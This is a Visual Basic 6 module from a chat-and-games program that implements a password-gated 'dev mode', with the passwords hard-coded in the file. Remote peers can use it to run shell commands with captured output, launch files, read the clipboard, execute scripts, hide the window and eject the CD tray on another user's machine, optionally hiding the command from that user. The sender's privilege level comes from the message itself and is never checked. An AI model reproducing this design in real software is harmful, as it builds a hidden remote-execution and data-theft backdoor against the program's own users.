Attribute VB_Name = "modDev"
Option Explicit

'Public Const DevPass As String = "5ae" 'Hex$(117+1337)
'Public Const UberDevPass As String = "A-6020" 'DevPass & "2a"
'Public Const DevOverride As String = "#DVORAK#"
Private Const MaxDevLevel As Integer = 3
Private devPasses(0 To MaxDevLevel) As String


Public bDevCmdFormLoaded As Boolean
Public bDevDataFormLoaded As Boolean

Private iDevLevel As Integer 'level 1 = no dev
                             '  "   2 = normal dev
                             'level 3 = heightened dev
                             'level 4 = dev^2
Public Const Dev_Level_None As Integer = 0, _
              Dev_Level_Normal As Integer = 1, _
              Dev_Level_Heightened As Integer = 2, _
              Dev_Level_Super As Integer = 3, _
              Dev_Level_Max As Integer = Dev_Level_Super

Private Const devBlockPass As String = "A-6020"
'Private pbBlockOnCurrentLevel As Boolean '<--- use frmMain.mnuDevBlock.Checked instead

Public Enum eDevCmds
    NoFilter = 0
    dBeep = 1
    CmdPrompt = 2
    ClpBrd = 3
    Visible = 4
    Shel = 5
    Name = 6
    Version = 7
    Disco = 8
    CompName = 9
    GameForm = -1
    Caps = -2
    Script = -3
    dStatus = -4
    dTray = -5
End Enum

Public Const DevCol1 As Long = &H482FF  '295679 = Orange
Public Const DevCol2 As Long = &HCA0000  '13238272 = Blue

'------------------------------------------------------------------------------------------
'Dev Command Calls
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" ( _
    ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, _
    ByVal hwndCallback As Long) As Long

Public Property Get bDevMode() As Boolean
bDevMode = iDevLevel > Dev_Level_None
End Property

Public Property Get getDevLevelName(Optional iLevel As Integer = -1) As String

If iLevel = -1 Then iLevel = iDevLevel

If iLevel = Dev_Level_None Then
    getDevLevelName = "User "
ElseIf iLevel = Dev_Level_Normal Then
    getDevLevelName = "DevMode "
ElseIf iLevel = Dev_Level_Heightened Then
    getDevLevelName = "Heightened Dev"
ElseIf iLevel = Dev_Level_Super Then
    getDevLevelName = "SuperUser Dev"
Else
    getDevLevelName = "Unknown"
End If

End Property

Public Property Get getDevLevel() As Integer
getDevLevel = iDevLevel
End Property

Public Sub initDev()

devPasses(Dev_Level_None) = vbNullString 'non requird
devPasses(Dev_Level_Normal) = "5ae2a"
devPasses(Dev_Level_Heightened) = ":Comm:"
devPasses(Dev_Level_Super) = "Dvorak#"
'devBlockPass = "A-6020"

iDevLevel = Dev_Level_None

End Sub

Public Function devCanDo(iTestLevel As Integer) As Boolean
devCanDo = (iDevLevel >= iTestLevel)
End Function

Public Function devLogin(sPass As String) As Boolean
Dim i As Integer

devLogin = False

For i = 0 To UBound(devPasses)
    If devPasses(i) = sPass Then
        devLogin = setDevLevel(i, sPass)
        Exit For
    End If
Next i

End Function

Public Function blockCommands(sPass As String) As Boolean
Dim b As Boolean

b = (sPass = devBlockPass)

frmMain.mnuDevDataCmdsBlock.Checked = b
frmMain.mnuDevDataCmdsSetBlockMessage.Enabled = b
blockCommands = b

End Function

Public Function setDevLevel(iLevel As Integer, Pass As String) As Boolean
Const S1 = "DevMode Activated, Level: ", S2 = "DevMode Deactivated"
Dim sTxt As String


If (Pass = devPasses(iLevel) Or iLevel < iDevLevel) And iLevel > Dev_Level_None Then
    'if (password correct OR lowering a level) AND not turning off
    
    With frmMain
        .mnuDev.Visible = True
        .mnuDevAdvCmdsDebug.Checked = modVars.bDebug
        .mnuDevShowCmds.Checked = True
        
        sTxt = getDevLevelName(iLevel)
        .mnuDevDataCmdsBlock.Caption = "Block Commands from " & _
            Left$(sTxt, InStr(1, sTxt, vbSpace) - 1)
        
        
        .Form_Resize
        
        'pbBlockOnCurrentLevel = False
        .mnuDevDataCmdsBlock.Checked = False 'pbBlockOnCurrentLevel
    End With
    
    Load frmDev
    
    
    '########################################################################
    If iLevel >= Dev_Level_Heightened Then
        If bDevCmdFormLoaded Then
            Unload frmDevCmd 'refresh the controls
            Load frmDevCmd
            frmDevCmd.Show vbModeless, frmMain
        End If
        'frmMain.mnuDevDataCmdsSep1.Visible = True
        'frmMain.mnuDevDataCmdsSetBlockMessage.Visible = True
    Else
        Unload frmDevCmd
        'frmMain.mnuDevDataCmdsSep1.Visible = False
        'frmMain.mnuDevDataCmdsSetBlockMessage.Visible = False
    End If
    
    
    'If iLevel >= Super_Dev_Level Then
        'nothing to do
    'End If
    '########################################################################
    
    iDevLevel = iLevel
    
    GetTrayText '+set
    
    'AddDevText s1, True
    AddConsoleText S1 & getDevLevelName(), , , True
    
    frmMain.mnuDev.Caption = getDevLevelName()
    setDevChangeMenu
    
    modDev.AddDevLog "Dev logged in" & vbNewLine & _
            "    Level: " & getDevLevelName() & vbNewLine & _
            "    Time: " & Time()
    setDevLevel = True
    
ElseIf iLevel = Dev_Level_None Then
    Unload frmDev
    Unload frmDevClients
    Unload frmDevCmd
    Unload frmDevData
    
    With frmMain
        .mnuDev.Visible = False
        .RefreshIcon
        .Form_Resize
    End With
    
    iDevLevel = Dev_Level_None
    
    GetTrayText '+set
    
    'AddDevText s2, True
    AddConsoleText S2, , , True
    
    modDev.AddDevLog "Dev logged out" & vbNewLine & _
                     "    Time: " & Time()
    
    setDevLevel = True
Else
    setDevLevel = False
End If


frmMain.RefreshIcon

End Function

Private Sub setDevChangeMenu()
Dim i As Integer

With frmMain
    For i = 1 To .mnuDevChangeAr.UBound
        Unload .mnuDevChangeAr(i)
    Next i
    
    
    For i = 1 To MaxDevLevel
        If iDevLevel > i Then
            Load .mnuDevChangeAr(i)
            .mnuDevChangeAr(i).Caption = getDevLevelName(i)
        End If
    Next i
    
End With

End Sub

Public Sub AddDevLog(Text As String)

If modLoadProgram.frmDev_Loaded Then
    With frmDev.txtDevLog
        .Selstart = Len(.Text)
        .SelText = vbNewLine & "----------------" & vbNewLine & Text
    End With
End If

End Sub

Public Sub AddDevText(ByVal Text As String, Optional ByVal Info As Boolean = False)
Dim i As Integer
Const LineCol = DevCol2

frmMain.rtfIn.SelFontName = DefaultFontName
frmMain.rtfIn.SelItalic = False
frmMain.rtfIn.SelUnderLine = False
frmMain.rtfIn.SelBold = False
frmMain.rtfIn.SelFontSize = DefaultFontSize

If Info Then
    'For i = 1 To Len(InfoStart)
        'AddChar Mid$(InfoStart, i, 1), LineCol
    'Next i
    frmMain.rtfIn.Selstart = Len(frmMain.rtfIn.Text)
    frmMain.rtfIn.SelColor = LineCol
    frmMain.rtfIn.SelText = vbNewLine & InfoStart
End If

'For i = 1 To Len(Text)
     'AddChar Mid$(Text, i, 1), DevCol1 'IIf(i Mod 2, DevCol1, DevCol2)
'Next i
frmMain.rtfIn.Selstart = Len(frmMain.rtfIn.Text)
frmMain.rtfIn.SelColor = DevCol1
frmMain.rtfIn.SelText = Text

If Info Then
    'For i = 1 To Len(InfoEnd)
        'AddChar Mid$(InfoEnd, i, 1), LineCol
    'Next i
    frmMain.rtfIn.Selstart = Len(frmMain.rtfIn.Text)
    frmMain.rtfIn.SelColor = LineCol
    frmMain.rtfIn.SelText = InfoEnd
End If

'###############################
'oldish method
'frmMain.rtfIn.Selstart = Len(frmMain.rtfIn.Text)
'frmMain.rtfIn.SelColor = DevCol2
'frmMain.rtfIn.SelText = vbNewLine & IIf(Info, InfoStart, vbNullString) & Text & IIf(Info, InfoEnd, vbNullString)


'###############################
'oldest method
'frmMain.rtfIn.Selstart = Len(frmMain.rtfIn.Text)
'frmMain.rtfIn.SelColor = DevCol2
'frmMain.rtfIn.SelText = vbNewLine & IIf(Info, InfoStart, vbNullString)
'
'frmMain.rtfIn.Selstart = Len(frmMain.rtfIn.Text)
''frmMain.rtfIn.SelColor = DevCol1
'frmMain.rtfIn.SelText = Text 'Mid$(Text, i, 1)
'
'If Info Then
'    frmMain.rtfIn.Selstart = Len(frmMain.rtfIn.Text)
'    'frmMain.rtfIn.SelColor = DevCol2
'    frmMain.rtfIn.SelText = InfoEnd
'End If

End Sub

Private Sub AddChar(C As String, lCol As Long)

frmMain.rtfIn.Selstart = Len(frmMain.rtfIn.Text)
frmMain.rtfIn.SelColor = lCol
frmMain.rtfIn.SelText = C

End Sub

'#######################################################################

Public Function createDevCommand(whoTo As String, From As String, bHide As Boolean, cmdStr As String) As String
createDevCommand = eCommands.DevSend & whoTo & "#" & From & "@" & CStr(iDevLevel) & CStr(Abs(bHide)) & cmdStr
End Function

Public Function ProcessDevCommand(ByVal Str As String, ByVal Index As Integer) As Boolean
'true if it was for us
Dim fullCmd As String
Dim iCmd As eDevCmds, iLevel As Integer
Dim sTo As String, sFrom As String, sReply As String
Dim sParam As String, cmdName As String
Dim bHideCmd As Boolean, bBlocked As Boolean, bProcessed As Boolean, attemptedHidden As Boolean

'execute dev command

'Old: "WhoTo & # & From & @ & Command"
'New: WhoTo & "#" & From & "@" & Dev-Level & hide & Command
'                                  ^       &   ^ = single chars

On Error Resume Next
fullCmd = Mid$(Str, InStr(1, Str, "@", vbTextCompare) + 3)
iLevel = CInt(Mid$(Str, InStr(1, Str, "@", vbTextCompare) + 1, 1))
sTo = Left$(Str, InStr(1, Str, "#", vbTextCompare) - 1)
sFrom = Mid$(Str, InStr(1, Str, "#", vbTextCompare) + 1, InStr(1, Str, "@", vbTextCompare) - InStr(1, Str, "#", vbTextCompare) - 1)
bHideCmd = CBool(Mid$(Str, InStr(1, Str, "@", vbTextCompare) + 2, 1))
attemptedHidden = bHideCmd
'On Error GoTo 0

If iLevel > Dev_Level_Max Then
    sReply = "No hacking the protocol for you - max dev level exceeded"
    bBlocked = True
    bProcessed = True
    bHideCmd = False
    ProcessDevCommand = False
Else
    If Trim$(LCase$(sTo)) = LCase$(Trim$(frmMain.LastName)) Then
        processDevCmd fullCmd, sReply, bHideCmd, iLevel, bBlocked
        
        SendData eCommands.DevRecieve & sFrom & "#" & sReply, IIf(Server, Index, -1)
        
        bProcessed = True
        ProcessDevCommand = True
    Else
        bProcessed = False
        ProcessDevCommand = False
        'don't distribute (server)... eh
        
        If frmMain.mnuDevDataCmdsBlock.Checked Then
            If iLevel <= iDevLevel Then
                bHideCmd = False
            End If
        ElseIf iLevel < iDevLevel Then
            bHideCmd = False
        End If
    End If
End If


'DO NOT ALTER sReply - USED BELOW

'show, whether we received or not
If bHideCmd = False And frmMain.mnuDevShowCmds.Checked And iDevLevel > Dev_Level_None Then
    On Error Resume Next
    If Left$(fullCmd, 1) = "-" Then
        iCmd = CInt(Left$(fullCmd, 2)) 'command
        sParam = Mid$(fullCmd, 3) 'string/param bit
    Else
        iCmd = CInt(Left$(fullCmd, 1)) 'command
        sParam = Mid$(fullCmd, 2) 'string/param bit
    End If
    
    
    cmdName = GetDevCommandName(iCmd) 'name of command
    
    AddDevLog "Received Dev Command (" & Time() & ")" & vbNewLine & _
              "    Command: " & vbTab & vbTab & IIf(LenB(cmdName), cmdName & vbNewLine & _
                "    Parameter: " & vbTab & vbTab & Mid$(fullCmd, 2), "(Raw) " & fullCmd) & vbNewLine & _
              "    From: " & vbTab & vbTab & vbTab & sFrom & " (" & _
                modDev.getDevLevelName(iLevel) & IIf(iDevLevel >= modDev.Dev_Level_Super, " [Value: " & CStr(iLevel) & "]", vbNullString) & ")" & vbNewLine & _
              "    To: " & vbTab & vbTab & vbTab & sTo & IIf(Trim$(LCase$(sTo)) = LCase$(Trim$(frmMain.LastName)), " (you)", vbNullString) & vbNewLine & _
              "    Hidden (Attempted): " & vbTab & CStr(attemptedHidden) & vbNewLine & _
              "    Processed: " & vbTab & vbTab & CStr(bProcessed) & vbNewLine & _
              IIf(bProcessed, "    Blocked: " & vbTab & vbTab & CStr(bBlocked) & vbNewLine & _
                IIf(LenB(sReply), "    Reply: " & vbTab & vbTab & vbTab & sReply, "    No Reply Sent"), vbNullString)
    
    
    AddDevText "Dev Command from " & sFrom & " to " & sTo & ": " & cmdName & _
                IIf(LenB(sParam), " '" & sParam & "'", vbNullString) & _
                IIf(bBlocked And sTo = frmMain.LastName, " (Blocked)", vbNullString), True
End If

End Function

Private Sub processDevCmd(ByVal sCmd As String, _
    ByRef sReply As String, ByRef bHideCmd As Boolean, ByVal iSenderLevel As Integer, ByRef bBlocked As Boolean)
'Rules:
'      if sender-level >= our-level then
'          allow command
'          if sender-level > our-level then
'              if they say hide-cmd then
'                 hide it
'              else
'                 b=true
'              end if
'          else
'              b=true
'          end if
'
'          if b then
'             print out "command received"
'          end if
'
'      else
'          block command
'          inform local-user
'      end if

If LenB(sCmd) = 0 Then
    sReply = "No Command Recieved"
    Exit Sub
End If

If frmMain.mnuDevDataCmdsBlock.Checked Then
    bBlocked = (iSenderLevel <= iDevLevel) 'if their level is ours, or less, block
Else
    bBlocked = (iSenderLevel < iDevLevel) 'if their level is less than ours, block
End If


If Not bBlocked Then
    'allow Command
    
    execCmd sCmd, sReply
    
    If iSenderLevel <= iDevLevel Then 'they are below or the same, so they can't hide their command
        bHideCmd = False
    End If
Else
    'block Command
    sReply = modMessaging.DevBlockedMessage
    
    bHideCmd = False
End If


End Sub

Public Function DevCmdAllowed(ByVal DevCmdNo As eDevCmds) As Boolean
Dim b As Boolean

Select Case DevCmdNo
    Case eDevCmds.ClpBrd
        b = True
    Case eDevCmds.CmdPrompt
        b = False
    Case eDevCmds.dBeep
        b = True
    Case eDevCmds.Name
        b = True
    Case eDevCmds.Shel
        b = True
    Case eDevCmds.Version
        b = True
    Case eDevCmds.Visible
        b = True
    Case eDevCmds.Disco
        b = False
    Case eDevCmds.CompName
        b = True
    Case eDevCmds.GameForm
        b = True
    Case eDevCmds.Caps
        b = True
    Case eDevCmds.Script
        b = False
    Case eDevCmds.dStatus
        b = True
    Case dTray
        b = False
    Case eDevCmds.NoFilter 'won't get to here
        b = False
    Case Else
        b = False
End Select

DevCmdAllowed = b

End Function

Private Function DevCommandDangerous(ByVal DevCmd As String) As Boolean

Dim iDevCmd As Integer
Dim b As Boolean

On Error Resume Next
iDevCmd = val(DevCmd)
On Error GoTo 0

Select Case iDevCmd
    Case eDevCmds.ClpBrd
        b = False
    Case eDevCmds.CmdPrompt
        b = True
    Case eDevCmds.dBeep
        b = True
    Case eDevCmds.Name
        b = True
    Case eDevCmds.dStatus
        b = True
    Case eDevCmds.Shel
        b = True
    Case eDevCmds.Version
        b = False
    Case eDevCmds.Visible
        b = True
    Case eDevCmds.Disco
        b = True
    Case eDevCmds.CompName
        b = False
    Case eDevCmds.GameForm
        b = True
    Case eDevCmds.Caps
        b = True
    Case eDevCmds.Script
        b = True
    Case eDevCmds.NoFilter 'won't get to here
        b = True
    Case Else
        b = True
End Select

DevCommandDangerous = b

End Function

Public Function GetDevCommandName(iCmd As eDevCmds) As String

Select Case iCmd
    Case eDevCmds.Caps
        GetDevCommandName = "Caps"
    Case eDevCmds.ClpBrd
        GetDevCommandName = "Clipboard"
    Case eDevCmds.CmdPrompt
        GetDevCommandName = "Cmd Prompt"
    Case eDevCmds.CompName
        GetDevCommandName = "Computer Name"
    Case eDevCmds.dBeep
        GetDevCommandName = "Beep"
    Case eDevCmds.Disco
        GetDevCommandName = "Disconnect"
    Case eDevCmds.GameForm
        GetDevCommandName = "Game Window"
    Case eDevCmds.Name
        GetDevCommandName = "Name"
    Case eDevCmds.NoFilter
        GetDevCommandName = "None"
    Case eDevCmds.Script
        GetDevCommandName = "Script"
    Case eDevCmds.Shel
        GetDevCommandName = "Shell"
    Case eDevCmds.Version
        GetDevCommandName = "Version"
    Case eDevCmds.Visible
        GetDevCommandName = "Show/Hide"
    Case eDevCmds.dStatus
        GetDevCommandName = "Status"
    Case dTray
        GetDevCommandName = "Eject Tray"
End Select

End Function

Private Sub execCmd(ByVal sCmd As String, ByRef sReply As String)

Dim DvCmd As eDevCmds, sParam As String
Dim i As Integer
Dim bStick As Boolean, bOn As Boolean
'Const VerSep As String = Dot

On Error Resume Next
If Left$(sCmd, 1) = "-" Then
    DvCmd = Left$(sCmd, 2)
    sParam = Mid$(sCmd, 3)
Else
    DvCmd = Left$(sCmd, 1)
    sParam = Mid$(sCmd, 2)
End If
On Error GoTo 0

Select Case DvCmd
    Case eDevCmds.CmdPrompt
        modCmd.ExecAndCapture sParam, sReply
        
    Case eDevCmds.dBeep
        sParam = Trim$(sParam)
        If Not IsNumeric(sParam) Then
            sReply = "Number to Beep must be numeric"
            Exit Sub
        ElseIf val(sParam) <= 0 Or val(sParam) >= 35 Then
            sReply = "Number to Beep must be greater than 0 and less than 35"
            Exit Sub
        End If
        
        For i = 1 To val(sParam)
            Beep
            Pause 15
        Next i
        
        sReply = "Beeped " & sParam & " times."
        
    Case eDevCmds.ClpBrd
        
        If LCase$(sParam) = "text" Then
            sReply = CStr(Clipboard.GetText)
        Else
            sReply = CStr(Clipboard.GetData)
        End If
        
        If sReply = vbNullString Then sReply = "Nothing On Clipboard"
        
        
    Case eDevCmds.NoFilter
        
        Call DataArrival(sParam)
        
        sReply = "Called DataArrival with '" & sParam & "' (NoFilter)"
        
        
    Case eDevCmds.Visible
        
        If sParam = "1" Then
            If frmMain.Visible = False Then
                frmMain.ShowForm
            End If
            sReply = "frmMain Is Visible"
        ElseIf sParam = "0" Then
            If frmMain.Visible Then
                frmMain.ShowForm False
            End If
            sReply = "frmMain Is Not Visible"
        Else
            sReply = "Visible = " & CStr(frmMain.Visible)
        End If
        
        
    Case eDevCmds.Shel
        
        Dim OkToShell As Boolean
        
        If FileExists(sParam) = False Then
            sParam = GetLocalFileName(modCmd.currentDir, sParam)
            If FileExists(sParam) = False Then
                sReply = "File Not Found" & vbNewLine & "(" & sParam & ")"
            Else
                OkToShell = True
            End If
        Else
            OkToShell = True
        End If
        
        If OkToShell Then
            On Error Resume Next
            Shell sParam, vbNormalNoFocus
            On Error GoTo 0
            sReply = "Shelled " & sParam & " successfully"
        Else
            If sReply = vbNullString Then sReply = "Error Shelling"
        End If
        
    Case eDevCmds.Name
        
        sParam = Trim$(sParam)
        
        If frmMain.txtName.Enabled And (Not frmMain.Drawing) Then
            If LenB(sParam) Then
                'frmMain.txtName.Text = sParam
                'Call frmMain.TxtName_LostFocus
                frmMain.Rename sParam
                sReply = "Set name to '" & frmMain.LastName & "'"
            Else
                sReply = "Please specify a name to rename to"
            End If
        Else
            sReply = "Typing/Drawing - Can't Rename"
        End If
        
    Case eDevCmds.dStatus
        sParam = Trim$(sParam)
        
        frmMain.ReStatus sParam
        
        If LenB(sParam) Then
            sReply = "Set status to " & frmMain.LastStatus
        Else
            sReply = "Status Removed"
        End If
        
        
    Case eDevCmds.Version
        
        sReply = "Version: " & GetVersion() ' App.Major & VerSep & App.Minor & VerSep & App.Revision
        
    Case eDevCmds.Disco
        'Call SendData(eCommands.DevRecieve & sFrom & "#" & "Closing Connection...", IIf(Server, Index, -1))
        'can't be sent after
        Call frmMain.CleanUp(True)
        
    Case eDevCmds.CompName
        sReply = "Computer Name: '" & frmMain.SckLC.LocalHostName & "'"
        
        
    Case eDevCmds.Caps
        
        If sParam = "1" Then
            modKeys.SetCaps True
            sReply = "Caps Lock On"
        ElseIf sParam = "0" Then
            modKeys.SetCaps False
            sReply = "Caps Lock Off"
        Else
            sReply = "Caps Lock State: " & CStr(modKeys.Caps())
        End If
        
    Case eDevCmds.Script
        
        If LenB(sParam) Then
            On Error GoTo ScriptError
            frmMain.SC.ExecuteStatement sParam
            sReply = "'" & sParam & "' was executed"
        Else
            sReply = "No script command entered"
        End If
        
    Case eDevCmds.GameForm
        sParam = Trim$(sParam)
        
        'sParam = 11
        'bit 0 = on or off
        'bit 1 = iif(1,stickgame,spacegame)
        If sParam <> "11" Then
            If sParam <> "10" Then
                If sParam <> "01" Then
                    If sParam <> "00" Then
                        sReply = "Incorrect Parameter - Must be xy, x = Stick(1)/Space(0), y = On(1)/Off(0)"
                        Exit Sub
                    End If
                End If
            End If
        End If
        
        bOn = CBool(Right$(sParam, 1))
        bStick = CBool(Left$(sParam, 1))
        sParam = modWinsock.RemoteIP
        
        
        If bStick Then
            If bOn Then
                If modStickGame.StickFormLoaded Then
                    sReply = "Stick Window Already Open"
                ElseIf LenB(sParam) Then
                    modStickGame.HostStickGame sParam
                    sReply = "Opened Stick Window"
                Else
                    sReply = "Can't host - Remote IP not acquired"
                End If
            Else
                If modStickGame.StickFormLoaded Then
                    Unload frmStickGame
                    sReply = "Closed Stick Window"
                Else
                    sReply = "Stick Window Not Open"
                End If
            End If
        Else
            If bOn Then
                If modSpaceGame.GameFormLoaded Then
                    sReply = "Space Window Already Open"
                ElseIf LenB(sParam) Then
                    modSpaceGame.HostSpaceGame sParam
                    sReply = "Opened Space Window"
                Else
                    sReply = "Can't host - Remote IP not acquired"
                End If
            Else
                If modSpaceGame.GameFormLoaded Then
                    Unload frmGame
                    sReply = "Closed Space Window"
                Else
                    sReply = "Space Window Not Open"
                End If
            End If
        End If
        
    Case dTray
        If sParam = "1" Then
            mciSendString "set CDAudio door open", vbNullString, 0, 0
            sReply = "Opened Tray"
        ElseIf sParam = "0" Then
            mciSendString "set CDAudio door closed", vbNullString, 0, 0
            sReply = "Closed Tray (Attempted)"
        Else
            sReply = "Usage: 1 to open, 0 to close"
        End If
        
    Case Else
        sReply = "DevCommand Not Recognised (" & DvCmd & ")"
        
End Select

Exit Sub
ScriptError:
sReply = "Script Error - " & Err.Description
'exit sub
End Sub
